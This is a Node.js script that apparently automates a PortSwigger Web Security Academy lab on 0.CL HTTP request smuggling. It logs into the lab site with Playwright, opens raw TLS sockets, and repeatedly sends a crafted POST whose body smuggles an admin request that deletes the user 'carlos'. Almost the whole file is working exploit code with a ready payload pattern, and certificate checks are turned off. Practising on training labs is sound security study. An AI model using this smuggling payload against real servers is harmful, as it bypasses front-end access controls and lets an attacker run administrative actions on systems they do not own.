#!/usr/bin/env node
/**
 * RS #12 - 0.CL Request Smuggling
 * Based on gwyomarch/WebSecurityAcademy approach
 * Uses raw TLS sockets with proper smuggle pattern
 */
const tls = require('node:tls');
const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function rawHttpRequest(host, payload, timeoutMs = 30000) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect({
      host,
      port: 443,
      servername: host,
      ALPNProtocols: ['http/1.1'],
      rejectUnauthorized: false,
    });
    
    let data = '';
    const timeout = setTimeout(() => {
      socket.destroy();
      resolve(data);
    }, timeoutMs);
    
    socket.on('connect', () => {
      console.log(`  Connected, sending ${payload.length} bytes`);
      socket.write(payload);
    });
    
    socket.on('data', chunk => {
      data += chunk.toString();
    });
    
    socket.on('end', () => {
      clearTimeout(timeout);
      resolve(data);
    });
    
    socket.on('close', () => {
      clearTimeout(timeout);
      resolve(data);
    });
    
    socket.on('error', err => {
      clearTimeout(timeout);
      reject(err);
    });
  });
}

async function getSession(page, labUrl) {
  await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await sleep(2000);
  await page.fill('input[name=username]', 'wiener');
  await page.fill('input[name=password]', 'peter');
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.click('button[type=submit]'),
  ]);
  await sleep(2000);
  
  const cookies = await page.context().cookies(labUrl);
  const session = cookies.find(c => c.name === 'session');
  return session?.value;
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([page.waitForNavigation({ timeout: 15000 }).catch(() => {}), page.click('#Login')]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await (await page.locator('a:has-text("ACCESS THE LAB")').first()).click();
    await sleep(40000);
    
    let labUrl = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { labUrl = u.replace(/\/$/, ''); break; }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab:', labUrl);
    
    const host = new URL(labUrl).hostname;
    
    // 0.CL doesn't need login - it's an admin-deleting smuggle
    // 0.CL smuggle pattern from gwyomarch:
    // POST /resources/images/blog.svg with Content-Length matching smuggled GET
    const smuggledRequest = `GET /admin/delete?username=carlos HTTP/1.1\r\nFoo: x`;
    
    const payload = 
      `POST /resources/images/blog.svg HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `Connection: keep-alive\r\n` +
      `Content-Length: ${smuggledRequest.length}\r\n` +
      `\r\n` +
      smuggledRequest;
    
    console.log('[*] Sending 0.CL smuggle attack...');
    console.log(`[*] Payload (${payload.length} bytes):`);
    console.log(payload.replace(/\r\n/g, '\\r\\n'));
    
    // Send multiple times in quick succession to land race
    for (let i = 0; i < 5; i++) {
      try {
        const response = await rawHttpRequest(host, payload, 10000);
        console.log(`[Attempt ${i+1}] Response (first 200): ${response.substring(0, 200)}`);
        await sleep(2000);
      } catch (e) {
        console.log(`[Attempt ${i+1}] Error: ${e.message}`);
      }
    }
    
    // Wait for processing
    await sleep(5000);
    
    // Verify
    console.log('[*] Verifying...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
